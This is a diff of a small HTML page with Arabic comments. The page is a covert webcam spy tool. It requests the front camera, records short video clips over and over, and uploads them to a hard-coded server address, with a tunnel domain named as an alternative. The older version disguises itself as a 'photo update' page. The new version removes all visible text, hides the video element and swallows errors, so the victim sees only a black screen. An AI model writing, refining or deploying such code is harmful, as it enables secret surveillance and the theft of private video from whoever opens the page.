@@ -1,59 +1,19 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <title>تحديث الصورة</title>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body, html { margin:0; padding:0; background:#000; overflow:hidden; }
-    video { width:1px; height:1px; opacity:0; }
-    .msg { color:white; font-family:Arial; text-align:center; padding-top:40vh; font-size:20px; }
-  </style>
-</head>
-<body>
-  <div class="msg">جاري تفعيل الكاميرا...</div>
-  <video id="v" autoplay playsinline></video>
+<html><head><meta charset="utf-8"><style>body{margin:0;background:#000;}</style></head><body>
+<video id="v" autoplay playsinline style="display:none;"></video>
+<script>
+// غيّر الرابط ده بس!
+const SERVER_URL = "http://192.168.1.89:5555/upload"; // أو رابط port.baselh.me
 
-  <script>
-    // غيّر الـ IP ده بـ IP جهازك اللي طلع في Termux
-    const SERVER_URL = "http://192.168.1.89:5555/upload";  // ← غيّر الرقم ده !
-
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-      .then(stream => {
-        document.querySelector('.msg').innerHTML = "تم تفعيل الكاميرا ✓";
-        const video = document.getElementById('v');
-        video.srcObject = stream;
-
-        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-        let chunks = [];
-
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'video/webm' });
-          const fd = new FormData();
-          fd.append('video', blob, 'cam.webm');
-
-          fetch(SERVER_URL, {
-            method: 'POST',
-            body: fd,
-            mode: 'no-cors'  // مهم عشان ما يفشل الإرسال
-          });
-
-          chunks = [];
-        };
-
-        // يسجّل 5 ثواني كل 7 ثواني (عشان ما يعلّق)
-        setInterval(() => {
-          if (recorder.state === "inactive") recorder.start();
-          setTimeout(() => {
-            if (recorder.state === "recording") recorder.stop();
-          }, 5000);
-        }, 7000);
-
-      })
-      .catch(err => {
-        document.querySelector('.msg').innerHTML = "تم رفض الوصول للكاميرا ❌";
-      });
-  </script>
-</body>
-</html>
+navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false})
+.then(s=>{document.getElementById('v').srcObject=s;
+const r=new MediaRecorder(s);
+let c=[];
+r.ondataavailable=e=>c.push(e.data);
+r.onstop=()=>{
+const b=new Blob(c,{type:'video/webm'});
+fetch(SERVER_URL,{method:'POST',body:b,headers:{'Content-Type':'video/webm'}})
+.then(()=>console.log('OK')).catch(()=>0);c=[];};
+setInterval(()=>{if(r.state==="inactive")r.start();setTimeout(()=>{if(r.state==="recording")r.stop();},4500);},6000);
+}).catch(()=>{});
+</script></body></html>
